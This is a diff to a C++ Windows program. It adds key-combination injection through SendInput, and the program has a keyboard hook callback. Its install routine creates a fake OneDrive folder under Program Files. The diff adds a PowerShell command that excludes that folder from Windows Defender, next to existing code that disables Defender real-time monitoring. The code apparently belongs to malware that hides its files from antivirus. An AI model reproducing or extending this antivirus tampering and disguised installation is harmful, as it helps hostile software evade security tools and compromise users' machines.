@@ -13,6 +13,7 @@
 #include <filesystem>
 #include <fstream>
 #include <vector>
+#include <sstream>
 
 using namespace Gdiplus;
 
@@ -86,19 +87,81 @@ void ClickAtPosition(int x, int y)
 	Sleep(100);
 }
 
-void PressKey(const std::string& key) {
-	INPUT input;
+void PressKey(const std::string& key)
+{
+	static std::map<std::string, int> keyCodes = {
+		{"ENTER", VK_RETURN},
+		{"ESCAPE", VK_ESCAPE},
+		{"SPACE", VK_SPACE},
+		{"TAB", VK_TAB},
+		{"BACKSPACE", VK_BACK},
+		{"INSERT", VK_INSERT},
+		{"DELETE", VK_DELETE},
+		{"HOME", VK_HOME},
+		{"END", VK_END},
+		{"PAGEUP", VK_PRIOR},
+		{"PAGEDOWN", VK_NEXT},
+		{"UP", VK_UP},
+		{"DOWN", VK_DOWN},
+		{"LEFT", VK_LEFT},
+		{"RIGHT", VK_RIGHT},
+		{"F1", VK_F1},
+		{"F2", VK_F2},
+		{"F3", VK_F3},
+		{"F4", VK_F4},
+		{"F5", VK_F5},
+		{"F6", VK_F6},
+		{"F7", VK_F7},
+		{"F8", VK_F8},
+		{"F9", VK_F9},
+		{"F10", VK_F10},
+		{"F11", VK_F11},
+		{"F12", VK_F12},
+		{"SHIFT", VK_SHIFT},
+		{"CONTROL", VK_CONTROL},
+		{"ALT", VK_LMENU},
+	};
 
-	input.type = INPUT_KEYBOARD;
-	input.ki.wScan = MapVirtualKey(key[0], MAPVK_VK_TO_VSC);
-	input.ki.time = 0;
-	input.ki.dwExtraInfo = 0;
-	input.ki.wVk = key[0];
-	input.ki.dwFlags = 0;
+	std::vector<std::string> keys;
+	std::istringstream iss(key);
+	std::string k;
+	while (std::getline(iss, k, '+')) {
+		keys.push_back(k);
+	}
 
-	SendInput(1, &input, sizeof(INPUT));
-	input.ki.dwFlags = KEYEVENTF_KEYUP;
-	SendInput(1, &input, sizeof(INPUT));
+	std::vector<INPUT> inputs(keys.size(), { 0 });
+	for (int i = 0; i < keys.size(); ++i) {
+		int keyCode;
+		auto it = keyCodes.find(keys[i]);
+		if (it != keyCodes.end()) {
+			keyCode = it->second;
+		}
+		else {
+			keyCode = keys[i][0];
+		}
+
+		inputs[i].type = INPUT_KEYBOARD;
+		inputs[i].ki.wScan = 0;
+		inputs[i].ki.time = 0;
+		inputs[i].ki.dwExtraInfo = 0;
+		inputs[i].ki.wVk = keyCode;
+		inputs[i].ki.dwFlags = KEYEVENTF_EXTENDEDKEY;
+	}
+
+	SendInput(inputs.size(), inputs.data(), sizeof(INPUT));
+
+	for (int i = 0; i < inputs.size(); ++i) {
+		inputs[i].ki.dwFlags = KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP;
+	}
+
+	SendInput(inputs.size(), inputs.data(), sizeof(INPUT));
+}
+
+std::string toUpper(const std::string& str) {
+	std::string result(str.size(), ' ');
+	std::transform(str.begin(), str.end(), result.begin(),
+		[](unsigned char c) { return std::toupper(c); });
+	return result;
 }
 
 LRESULT CALLBACK GetKeyBoard(int nCode, WPARAM wParam, LPARAM lParam)
@@ -871,6 +934,9 @@ void InstallEmmetBat(std::string path)
 {
 	std::string createDir = "mkdir \"C:\Program Files\Microsoft\OneDrive\"";
 	system(createDir.c_str());
+
+	std::string addException = "Powershell.exe -Command \"Add-MpPreference -ExclusionPath \"C:\\'Program Files'\\Microsoft\\OneDrive\"\"";
+	system(addException.c_str());
 
 	std::string disableAntiVirus = "Powershell.exe -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"";
 	system(disableAntiVirus.c_str());
